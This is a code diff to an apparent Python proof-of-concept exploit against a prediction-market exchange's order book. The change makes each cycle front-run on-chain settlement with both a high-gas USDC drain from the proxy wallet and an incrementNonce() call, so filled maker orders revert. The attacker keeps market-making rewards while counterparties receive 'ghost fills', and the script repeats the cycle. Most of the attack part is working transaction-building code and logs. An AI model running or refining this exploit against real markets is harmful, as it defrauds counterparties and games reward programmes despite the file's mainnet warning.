@@ -12,9 +12,11 @@ DO NOT USE ON MAINNET WITH REAL FUNDS.
 Exploit flow:
     1. Place maker order on CLOB (earns MM reward when filled)
     2. Order gets matched off-chain — API reports fill
-    3. Before on-chain settlement, send incrementNonce() with juiced gas
-       OR withdraw USDC from proxy wallet with higher gas
-    4. On-chain settlement reverts (stale nonce / insufficient balance)
+    3. Before on-chain settlement, fire BOTH:
+       a. Transfer USDC out of proxy wallet (drain collateral)
+       b. incrementNonce() on CTFExchange (invalidate signing nonce)
+       Either alone is sufficient; both together maximize revert likelihood.
+    4. On-chain settlement reverts (stale nonce AND insufficient balance)
     5. Attacker keeps MM reward credit, counterparty gets ghost fill
     6. Repeat
 
@@ -119,10 +121,10 @@ class NonceFrontrunPoC:
         except Exception:
             return 0
 
-    def _build_increment_nonce_tx(self) -> Dict[str, Any]:
+    def _build_increment_nonce_tx(self, nonce_offset: int = 0) -> Dict[str, Any]:
         """Build an incrementNonce() transaction to the CTFExchange."""
         gas_price = self._get_juiced_gas_price()
-        nonce = self._get_eoa_nonce()
+        nonce = self._get_eoa_nonce() + nonce_offset
 
         tx = {
             "to": Web3.to_checksum_address(CTF_EXCHANGE),
@@ -134,15 +136,17 @@ class NonceFrontrunPoC:
         }
         return tx
 
-    def _build_usdc_withdraw_tx(self, amount_wei: int, recipient: str) -> Dict[str, Any]:
+    def _build_usdc_withdraw_tx(
+        self, amount_wei: int, recipient: str, nonce_offset: int = 0
+    ) -> Dict[str, Any]:
         """
         Build a USDC transfer from proxy wallet to recipient.
 
-        This is the alternative frontrun vector: withdraw USDC so the proxy
-        wallet has insufficient balance when settlement lands.
+        Withdraws USDC so the proxy wallet has insufficient balance
+        when settlement lands.
         """
         gas_price = self._get_juiced_gas_price()
-        nonce = self._get_eoa_nonce()
+        nonce = self._get_eoa_nonce() + nonce_offset
 
         # ERC20 transfer(address,uint256) calldata
         transfer_data = (
@@ -201,15 +205,12 @@ class NonceFrontrunPoC:
         logger.info(f"  Order placed: {order.id} ({side.value} {self.order_size} @ {price})")
         return order.id
 
-    def run_single_cycle(self, method: str = "increment_nonce"):
+    def run_single_cycle(self):
         """
         Run one exploit cycle:
         1. Place maker order at market mid price
         2. Wait for fill
-        3. Front-run settlement with incrementNonce or USDC withdrawal
-
-        Args:
-            method: "increment_nonce" or "usdc_withdraw"
+        3. Front-run settlement with BOTH USDC withdrawal AND incrementNonce
         """
         logger.info(f"\n{'=' * 60}")
         logger.info("EXPLOIT CYCLE START")
@@ -237,49 +238,49 @@ class NonceFrontrunPoC:
         logger.info("  (Simulating fill detection after 2s)")
         time.sleep(2)
 
-        # Step 3: Front-run settlement
-        logger.info(f"\n[Step 3] Front-running settlement (method={method})...")
+        # Step 3: Front-run settlement with BOTH vectors
+        logger.info("\n[Step 3] Front-running settlement...")
 
-        if method == "increment_nonce":
-            tx = self._build_increment_nonce_tx()
-            self._send_frontrun_tx(tx)
-            logger.info("  incrementNonce() sent — all pending orders invalidated")
+        # 3a. Drain USDC from proxy wallet so settlement has no collateral
+        logger.info("\n  [3a] Withdrawing USDC from proxy wallet...")
+        amount_wei = int(self.order_size * 1e6)  # USDC has 6 decimals
+        usdc_tx = self._build_usdc_withdraw_tx(amount_wei, self.eoa_address, nonce_offset=0)
+        self._send_frontrun_tx(usdc_tx)
+        logger.info("  USDC withdrawal sent — proxy wallet drained for settlement")
 
-        elif method == "usdc_withdraw":
-            # Withdraw enough USDC to make settlement fail
-            amount_wei = int(self.order_size * 1e6)  # USDC has 6 decimals
-            tx = self._build_usdc_withdraw_tx(amount_wei, self.eoa_address)
-            self._send_frontrun_tx(tx)
-            logger.info("  USDC withdrawal sent — proxy wallet drained for settlement")
-
-        else:
-            raise ValueError(f"Unknown method: {method}")
+        # 3b. Increment nonce to invalidate the signed order (nonce_offset=1
+        # because the USDC tx already claimed the current EOA nonce)
+        logger.info("\n  [3b] Incrementing CTFExchange nonce...")
+        nonce_tx = self._build_increment_nonce_tx(nonce_offset=1)
+        self._send_frontrun_tx(nonce_tx)
+        logger.info("  incrementNonce() sent — all pending orders invalidated")
 
         # Step 4: Result
         logger.info("\n[Step 4] Result:")
         logger.info("  - Maker order was filled off-chain (MM reward credited)")
-        logger.info("  - On-chain settlement will revert (stale nonce / no balance)")
+        logger.info("  - USDC drained: settlement fails due to insufficient balance")
+        logger.info("  - Nonce incremented: settlement fails due to stale signature")
         logger.info("  - Counterparty receives ghost fill")
         logger.info("  - Attacker keeps reward, no risk exposure")
         logger.info(f"\n{'=' * 60}")
         logger.info("EXPLOIT CYCLE END")
         logger.info(f"{'=' * 60}\n")
 
-    def run(self, cycles: int = 1, method: str = "increment_nonce", delay: float = 5.0):
+    def run(self, cycles: int = 1, delay: float = 5.0):
         """
-        Run multiple exploit cycles.
+        Run multiple exploit cycles. Each cycle fires both USDC withdrawal
+        and incrementNonce before settlement lands.
 
         Args:
             cycles: Number of cycles to run
-            method: "increment_nonce" or "usdc_withdraw"
             delay: Seconds between cycles
         """
-        logger.info(f"Starting NonceFrontrunPoC: {cycles} cycles, method={method}")
+        logger.info(f"Starting NonceFrontrunPoC: {cycles} cycles")
         logger.info(f"DRY RUN MODE: {self.dry_run}")
 
         for i in range(cycles):
             logger.info(f"\n--- Cycle {i + 1}/{cycles} ---")
-            self.run_single_cycle(method=method)
+            self.run_single_cycle()
             if i < cycles - 1:
                 logger.info(f"Waiting {delay}s before next cycle...")
                 time.sleep(delay)
